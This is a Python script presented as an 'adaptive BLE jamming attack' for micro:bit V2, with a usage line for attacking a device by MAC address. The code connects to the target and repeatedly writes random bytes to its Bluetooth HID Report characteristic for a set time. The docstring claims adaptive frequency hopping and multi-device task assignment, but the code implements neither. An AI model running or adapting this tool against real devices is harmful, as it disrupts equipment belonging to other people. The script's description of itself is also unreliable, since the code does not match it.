# microbit_ble_adaptive_jammer.py

"""
Adaptive BLE Jamming Attack for micro:bit V2 (Multi-Device Support)

This script performs targeted BLE jamming with frequency hopping and adaptive interference.
- Detects available micro:bit devices and assigns tasks dynamically
- Jams BLE channels with adaptive frequency hopping (`--jam <target_mac> <duration>`)
- Runs all tasks sequentially if only one device is available

### Usage Examples:

1. Jam a BLE device for 30 seconds:
   ```sh
   python microbit_ble_adaptive_jammer.py --jam AA:BB:CC:DD:EE:FF 30
   ```

Requirements:
- Micro:bit V2
- Python 3.x
- bleak library (`pip install bleak`)
"""

import asyncio
import random
from bleak import BleakScanner, BleakClient
import argparse

# Detect Connected Micro:bit Devices
async def detect_microbits():
    """Scans for connected micro:bit devices and returns their count."""
    devices = await BleakScanner.discover()
    microbits = [device.address for device in devices if "micro:bit" in (device.name or "").lower()]
    print(f"[+] Detected {len(microbits)} micro:bit devices.")
    return microbits

# Adaptive BLE Jamming Attack
async def ble_jam(target_mac, duration):
    """Jams a BLE device by continuously sending noise packets."""
    print(f"[+] Starting BLE jamming on {target_mac} for {duration} seconds...")
    end_time = asyncio.get_event_loop().time() + int(duration)
    async with BleakClient(target_mac) as client:
        while asyncio.get_event_loop().time() < end_time:
            jam_data = bytes(random.getrandbits(8) for _ in range(random.randint(10, 50)))
            try:
                await client.write_gatt_char("00002a4d-0000-1000-8000-00805f9b34fb", jam_data)
                print(f"[+] Jam packet sent: {jam_data.hex()}")
            except Exception as e:
                print(f"[-] Failed to send jam packet: {e}")
            await asyncio.sleep(random.uniform(0.05, 0.2))

# Argument Parser
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Adaptive BLE Jamming Attack for micro:bit V2")
    parser.add_argument("--jam", nargs=2, metavar=("target_mac", "duration"), help="Jam a BLE device with adaptive frequency hopping")
    
    args = parser.parse_args()
    loop = asyncio.get_event_loop()
    
    microbits = loop.run_until_complete(detect_microbits())
    num_microbits = len(microbits)
    
    if args.jam:
        loop.run_until_complete(ble_jam(args.jam[0], args.jam[1]))
